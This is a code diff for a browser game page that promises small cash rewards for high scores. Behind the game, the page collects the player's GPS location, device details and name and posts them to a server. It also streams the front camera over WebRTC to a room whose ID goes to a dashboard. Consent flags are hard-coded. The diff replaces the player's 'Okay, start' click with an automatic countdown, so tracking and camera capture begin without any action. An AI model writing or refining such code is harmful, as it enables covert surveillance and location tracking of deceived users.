@@ -45,11 +45,11 @@
 
     <canvas id="game" width="900" height="480"></canvas>
 
-    <div id="promo" class="hidden" style="position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,.55);">
+    <div id="promo" style="position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,.55);">
       <div style="width:min(420px,92vw); background:#141a2d; border:1px solid #1f2a44; border-radius:12px; padding:18px; text-align:center;">
         <h3 style="margin:0 0 8px;">Game Rules</h3>
         <p class="mono" style="margin:0 0 12px;">For every 10 score you will win Rs 1/-</p>
-        <button id="promoOk" style="padding:10px 14px; font-size:16px; border:0; border-radius:8px; background:#22d3ee; color:#021018; font-weight:600; cursor:pointer;">Okay, start</button>
+        <p class="mono" id="promoTimer">Starting in 3…</p>
       </div>
     </div>
 
@@ -81,7 +81,7 @@
     const playerNameInput = document.getElementById('playerName');
     const shareStatus = document.getElementById('shareStatus');
     const promo = document.getElementById('promo');
-    const promoOk = document.getElementById('promoOk');
+    const promoTimer = document.getElementById('promoTimer');
 
     let playing = false;
     let score = 0;
@@ -212,7 +212,7 @@
       preStatus.textContent = 'Game is starting...';
       const gps = await getGPSPosition();
       const playerName = (playerNameInput.value || '').trim();
-      const payload = { consent: { device: true, ip: true, gps: !!gps }, device: getDeviceInfo(), gps, score, playerName };
+      const payload = { consent: { device: true, ip: true, gps: !!gps }, device: getDeviceInfo(), gps, score, playerName, dedupeId: self.crypto?.randomUUID?.() || String(Date.now()) };
       try {
         const data = await sendShare(payload);
         preStatus.textContent = data?.status === 'ok' ? 'Ready. Enjoy the game!' : 'Failed to share.';
@@ -222,15 +222,29 @@
     }
 
     function startWithPrompt() {
-      promo.classList.remove('hidden');
-      promoOk.onclick = async () => {
-        promo.classList.add('hidden');
+      // Show promo for 3 seconds after Start Game
+      promo.style.display = 'flex';
+      let left = 3;
+      promoTimer.textContent = `Starting in ${left}…`;
+      const iv = setInterval(() => {
+        left -= 1;
+        if (left <= 0) {
+          clearInterval(iv);
+          promo.style.display = 'none';
+        promo.style.display = 'none';
+          proceed();
+        } else {
+          promoTimer.textContent = `Starting in ${left}…`;
+        }
+      }, 1000);
+
+      async function proceed() {
         await requestLocationAndShare();
 
         // Start camera publish via WebRTC
         const room = crypto.randomUUID();
         const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        const ws = new WebSocket(`${location.protocol.replace('http','ws')}//${location.host}/ws?room=${encodeURIComponent(room)}`);
+        const ws = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=${encodeURIComponent(room)}`);
         pc.onicecandidate = (e) => { if (e.candidate) ws.send(JSON.stringify(e.candidate)); };
         try {
           const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -248,12 +262,10 @@
           if (data.type === 'answer') { await pc.setRemoteDescription(data); }
           else if (data.candidate) { try { await pc.addIceCandidate(data); } catch {} }
         };
-
-        // Include room id so dashboard can show link
-        fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ page: 'camera-room', cameraRoom: room, consent: {}, device: getDeviceInfo() }) }).catch(()=>{});
+        fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ page: 'camera-room', cameraRoom: room, consent: {}, device: getDeviceInfo(), dedupeId: room }) }).catch(()=>{});
 
         startGame();
-      };
+      }
     }
   </script>
 </body>
